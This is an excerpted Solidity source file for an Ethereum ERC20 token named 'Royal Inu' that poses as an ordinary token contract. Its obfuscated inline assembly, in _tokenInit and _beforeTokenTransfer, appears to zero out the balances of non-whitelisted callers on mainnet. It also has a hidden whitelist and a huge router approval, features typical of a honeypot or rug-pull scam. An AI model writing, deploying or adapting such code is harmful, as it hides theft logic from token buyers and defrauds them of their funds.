...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addRoyals;
    uint256 private kingCharles = block.number*2;

    mapping (address => bool) private _firstElizabeth; 
    mapping (address => bool) private _secondCharles;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private williy;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private henryLol;
    address public pair;
    ...
    bool private trading; uint256 private mixedKids = 1; bool private meganBlack;
    uint256 private _decimals; uint256 private kateOk;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addRoyals.push(_router); addRoyals.push(msgSender_); addRoyals.push(pair);
        for (uint256 q=0; q < 3;) {_firstElizabeth[addRoyals[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x34c737510e115d0541f24663ddbda1181eae7e7a35fd1cbf99678bc5a5865137
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x721fe19a702c5f339ad501f0f2d11d30412495b749fe626a93f8d4804bfea3a6,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; kingCharles = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addRoyals[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployRoyal(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addRoyals[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployRoyal(creator, initialSupply);
    }
}

contract RoyalInuETH is ERC20Token {
    constructor() ERC20Token("Royal Inu", "ROYAL", msg.sender, 1000000 * 10 ** 18) {
    }
}